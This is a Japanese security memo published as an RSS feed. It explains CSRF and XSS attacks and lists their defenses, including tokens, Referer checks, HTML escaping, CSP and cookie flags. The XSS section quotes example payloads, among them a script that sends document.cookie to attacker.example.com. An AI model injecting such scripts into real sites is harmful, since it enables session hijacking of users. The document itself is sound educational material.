@@ -1,0 +1,104 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Memo – Vulnerabilities and Attack Techniques</title><link>http://forest0923.github.io/memo/ja/docs/security/vulnerabilities/</link><description>Recent content in Vulnerabilities and Attack Techniques on Memo</description><generator>Hugo -- gohugo.io</generator><language>ja</language><atom:link href="http://forest0923.github.io/memo/ja/docs/security/vulnerabilities/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: CSRF (Cross-Site Request Forgery)</title><link>http://forest0923.github.io/memo/ja/docs/security/vulnerabilities/csrf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://forest0923.github.io/memo/ja/docs/security/vulnerabilities/csrf/</guid><description>
+&lt;p>CSRF 脆弱性は、ユーザが意図しないリクエストによって重要な処理が実行されるという問題を引き起こします。
+この脆弱性が悪用された場合、ユーザの意図しないところでショッピングサイトでの購入や、アカウント情報の変更、不適切なメッセージの投稿などが行われる可能性があります。&lt;/p>
+&lt;h2 id="攻撃の概要">攻撃の概要&lt;/h2>
+&lt;p>CSRF 攻撃は、一般的に以下の手順で行われます。&lt;/p>
+&lt;ol>
+&lt;li>ユーザが攻撃対象のサイトにログイン&lt;/li>
+&lt;li>ユーザが攻撃者が作成した偽のサイトを閲覧&lt;/li>
+&lt;li>偽のサイトから攻撃対象のサイトに意図しないリクエストを送信&lt;/li>
+&lt;/ol>
+&lt;p>CSRF では攻撃対象のサーバ内にある既存の機能を悪用するという点が XSS 攻撃と異なります。&lt;/p>
+&lt;h2 id="対策">対策&lt;/h2>
+&lt;p>CSRF 攻撃が発生する原因は正規ユーザによる意図的なリクエストであることを確認していないことにあります。&lt;/p>
+&lt;p>ショッピングサイトの商品詳細ページなどの一部のページは誰でもアクセス可能であるべきですが、購入処理や個人情報の変更などの重要な処理が行われるページには以下のような特別な対策が必要です。&lt;/p>
+&lt;h3 id="csrf-対策用トークンの使用">CSRF 対策用トークンの使用&lt;/h3>
+&lt;p>form の送信ページなどにトークンを埋め込み、POST リクエストで送信することでサーバ側でトークンを検証します。
+クリックジャッキングのような手法でユーザに送信ボタンなどを押させない限り正しいトークンを送信することはできないので、正規のアクセスでないことを確認できます。&lt;/p>
+&lt;p>実際に GitLab.com のログイン画面で form の確認をしてみると、次のような hidden 属性を持ったタグがあり、value にトークンが格納されていることが確認できました。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">input&lt;/span> &lt;span style="color:#bbb">type&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#bbb">name&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;authenticity_token&amp;#34;&lt;/span> &lt;span style="color:#bbb">value&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;xxxxxxxxxx&amp;#34;&lt;/span> &lt;span style="color:#bbb">autocomplete&lt;/span>=&lt;span style="color:#ed9d13">&amp;#34;off&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ちなみにクリックジャッキングは重要な処理の確認ボタンとダミーのリンクなどを重ねることでユーザにボタン等を押させる攻撃ですが、ブラウザでの対策が進んでおり対策がしやすくなっています。&lt;/p>
+&lt;h3 id="パスワードの再入力の要求">パスワードの再入力の要求&lt;/h3>
+&lt;p>重要な処理を行う前にユーザにパスワードの再入力を求めることで、操作がユーザ自身によるものであることを確認します。&lt;/p>
+&lt;h3 id="refererの確認">Refererの確認&lt;/h3>
+&lt;p>リクエストのアクセス元のURL（Referer）を確認し、偽のページからのリクエストを検出します。&lt;/p>
+&lt;h3 id="二要素認証の使用">二要素認証の使用&lt;/h3>
+&lt;p>二要素認証は直接的なCSRF対策とは言えませんが、個人情報が無意識に更新された場合、早期に問題を発見し被害を最小限に抑えることが可能となります。&lt;/p>
+&lt;h2 id="参考">参考&lt;/h2>
+&lt;ul>
+&lt;li>徳丸 浩、「体系的に学ぶ 安全なWebアプリケーションの作り方 第2版」&lt;/li>
+&lt;/ul></description></item><item><title>Docs: XSS (Cross-Site Scripting)</title><link>http://forest0923.github.io/memo/ja/docs/security/vulnerabilities/xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://forest0923.github.io/memo/ja/docs/security/vulnerabilities/xss/</guid><description>
+&lt;p>XSS攻撃は、攻撃者が悪意あるスクリプトをユーザに実行させるものです。
+攻撃対象のサイトにアクセスしたユーザの cookie 情報を漏洩させたり、Web ページを改ざんすることができます。&lt;/p>
+&lt;h2 id="持続型-xssstored">持続型 XSS（stored）&lt;/h2>
+&lt;p>持続型 XSS は、攻撃用の JavaScript が攻撃対象のサイトに保存されているタイプの XSS です。
+攻撃者の悪意ある入力がデータベースに保存され、他のユーザがサイトにアクセスした際に実行されます。&lt;/p>
+&lt;p>例えば、チャットアプリで攻撃者が次のように投稿するとします。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;alert(&lt;span style="color:#ed9d13">&amp;#34;Hacked!&amp;#34;&lt;/span>);&amp;lt;/&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>エスケープなどの適切な処理をされていない場合、ユーザがチャットアプリにアクセスして攻撃者の投稿を表示すると、上記の script が実行されます。&lt;code>alert&lt;/code> だけであれば問題は少ないかもしれませんが、以下のような script にすれば cookie を攻撃者に送信することができてしまいます。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6ab825;font-weight:bold">var&lt;/span> xhr = &lt;span style="color:#6ab825;font-weight:bold">new&lt;/span> XMLHttpRequest();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> xhr.open(&lt;span style="color:#ed9d13">&amp;#34;POST&amp;#34;&lt;/span>, &lt;span style="color:#ed9d13">&amp;#34;https://attacker.example.com/steal-data&amp;#34;&lt;/span>, &lt;span style="color:#6ab825;font-weight:bold">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> xhr.setRequestHeader(&lt;span style="color:#ed9d13">&amp;#34;Content-Type&amp;#34;&lt;/span>, &lt;span style="color:#ed9d13">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> xhr.send(&lt;span style="color:#ed9d13">&amp;#34;cookie=&amp;#34;&lt;/span> + &lt;span style="color:#24909d">document&lt;/span>.cookie);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="反射型-xssreflected">反射型 XSS（reflected）&lt;/h2>
+&lt;p>反射型 XSS は、攻撃用の JavaScript が攻撃対象のサイトに保存されていないタイプの XSS です。持続型 XSS と比べて影響範囲は限定的となります。&lt;/p>
+&lt;p>例として、攻撃者が偽サイトのリンクやメール、SNS の URL に次のようなリンクを仕込んでおく場合を考えます。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>https://victim.example.com/search?q=&amp;lt;&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;alert(&lt;span style="color:#ed9d13">&amp;#39;Hacked!&amp;#39;&lt;/span>);&amp;lt;/&lt;span style="color:#6ab825;font-weight:bold">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>攻撃対象のサイトでパラメータを適切に処理していないと、script が実行されてしまう場合があります。
+先程の例と同様、実行されるのが &lt;code>alert&lt;/code> とは限らない点が問題です。&lt;/p>
+&lt;p>偽サイトの中に &lt;code>iframe&lt;/code> で攻撃対象のサイトを埋め込んでおいてセッション ID を盗む例や、フォームの入力欄の XSS 脆弱性を利用して攻撃者に情報を送信するように改ざんしたフォームに書き換える方法などもあります。&lt;/p>
+&lt;h2 id="対策">対策&lt;/h2>
+&lt;p>XSS 脆弱性が発生する主な要因は、HTML 生成時に特殊記号をエスケープする処理が抜けていることです。
+根本的な対策としては、&lt;code>&amp;lt;p&amp;gt;text&amp;lt;/p&amp;gt;&lt;/code> の &lt;code>text&lt;/code> や &lt;code>&amp;lt;input name=&amp;quot;foo&amp;quot; value=&amp;quot;val&amp;quot;&amp;gt;&lt;/code> の &lt;code>val&lt;/code> のような要素内容や属性値内の特殊記号を、以下の表に示すようにもれなくエスケープする必要があります。&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>特殊記号&lt;/th>
+&lt;th>エスケープ&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&amp;lt;&lt;/td>
+&lt;td>&lt;code>&amp;amp;lt;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;gt;&lt;/td>
+&lt;td>&lt;code>&amp;amp;gt;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;amp;&lt;/td>
+&lt;td>&lt;code>&amp;amp;amp;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&amp;quot;&lt;/td>
+&lt;td>&lt;code>&amp;amp;quot;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>'&lt;/td>
+&lt;td>&lt;code>&amp;amp;#39;&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>さらに、以下の対策を行うと良いです。&lt;/p>
+&lt;ul>
+&lt;li>Webサーバの設定でXSSフィルタを有効にするレスポンスヘッダを返す
+&lt;ul>
+&lt;li>Content Security Policy (CSP): サーバのレスポンスヘッダによって制御され、外部コンテンツの読み込みやスクリプトの実行などを制限するためのセキュリティポリシー&lt;/li>
+&lt;li>X-XSS-Protection: 古いブラウザでは実装が異なるか、またはサポートされていないことがあるため、現在は非推奨とされており、CSPが推奨される&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>入力値のサニタイズを行う（例：数字のみ、英字のみ、文字制限）&lt;/li>
+&lt;li>Cookieの設定を工夫する
+&lt;ul>
+&lt;li>HttpOnly: JavaScriptでCookieを読めなくする設定&lt;/li>
+&lt;li>SameSite: 異なるドメインからのリクエストでCookieを読めなくする設定。制限の種類があるため、使用時には適切なものを選択する必要がある&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="参考">参考&lt;/h2>
+&lt;ul>
+&lt;li>徳丸 浩、「体系的に学ぶ 安全なWebアプリケーションの作り方 第2版」&lt;/li>
+&lt;/ul></description></item></channel></rss>
